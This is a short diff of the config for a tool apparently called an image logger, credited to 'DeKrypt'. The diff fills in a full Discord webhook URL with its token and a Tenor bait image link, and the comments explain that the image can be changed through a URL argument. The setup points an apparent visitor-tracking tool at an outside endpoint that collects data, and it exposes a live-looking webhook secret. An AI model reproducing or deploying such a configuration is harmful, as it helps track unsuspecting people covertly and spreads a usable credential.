@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1412749755888566283/CShVC6-OXUTF_-XJO-82r1ZHFtXMNdrQIcSUoHowhvYIyA7aFbUz8J_dGILzOiqjdA0W",
+    "image": "https://images-ext-1.discordapp.net/external/PTsVuKMUbQLksq-op9IYIoPSvQSw5vmBSk1UGL12qJo/https/media.tenor.com/EX3kL5OBZnEAAAPo/are-baxma-made-by-ehed.mp4", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
